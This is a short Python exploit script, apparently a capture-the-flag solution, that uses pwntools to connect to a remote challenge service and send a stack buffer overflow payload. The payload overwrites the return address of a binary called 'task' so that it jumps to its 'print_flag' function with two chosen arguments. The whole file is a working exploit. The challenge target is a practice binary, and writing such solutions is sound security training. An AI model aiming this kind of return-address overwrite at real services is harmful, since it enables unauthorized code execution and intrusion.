from pwn import *

elf = ELF('./task')
env = [
    'LD_PRELOAD=/lib/libc.so.6',  # Adjust the path to your libc if necessary
]

# p = process('./task', env=env) if we need to set environment variables
# p = elf.process() if we don't need to set environment variables

p = remote('rivit.dev', 10000)  # Replace with the actual remote address and port

offset = 44 # Offset to the return address in the stack
flag = elf.symbols['print_flag']
main = elf.symbols['main']

# Create the payload
payload = b''.join(
    [
        b'A' * offset,
        p32(flag),
        p32(main), # Padding or weird value
        p32(0xFFFFFAC7), # First argument
        p32(0x00C0FFEE) # Second argument
    ]
)

p.sendline(payload)
p.interactive()

p.close()